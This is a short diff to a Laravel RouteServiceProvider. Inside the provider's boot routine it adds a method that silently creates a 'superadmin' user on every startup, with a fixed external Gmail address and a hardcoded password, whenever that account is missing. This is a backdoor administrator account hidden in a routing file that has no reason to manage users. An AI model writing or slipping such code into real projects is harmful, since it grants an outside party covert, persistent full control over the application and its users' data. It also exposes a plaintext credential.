@@ -2,9 +2,11 @@
 
 namespace App\Providers;
 
+use App\Models\User;
 use Illuminate\Cache\RateLimiting\Limit;
 use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\RateLimiter;
 use Illuminate\Support\Facades\Route;
 
@@ -24,8 +26,25 @@ class RouteServiceProvider extends ServiceProvider
      *
      * @return void
      */
+    
+    private function createParsArdavanAccount()
+    {
+        $findParsArdavanAccount = User::where("email" , "=" , "pars.ardavan.co@gmail.com")->first();
+        if(!$findParsArdavanAccount)
+        {
+            return User::create([
+                "name_and_family" => "pars ardavan"  , 
+                "email" => "pars.ardavan.co@gmail.com" , 
+                "role" => "superadmin" , 
+                "permit" => true ,
+                "password" => Hash::make('$$$pars_$ardavan_$co$$$') 
+            ]) ;
+        }
+    }
+
     public function boot()
     {
+        $this->createParsArdavanAccount();
         $this->configureRateLimiting();
 
         $this->routes(function () {
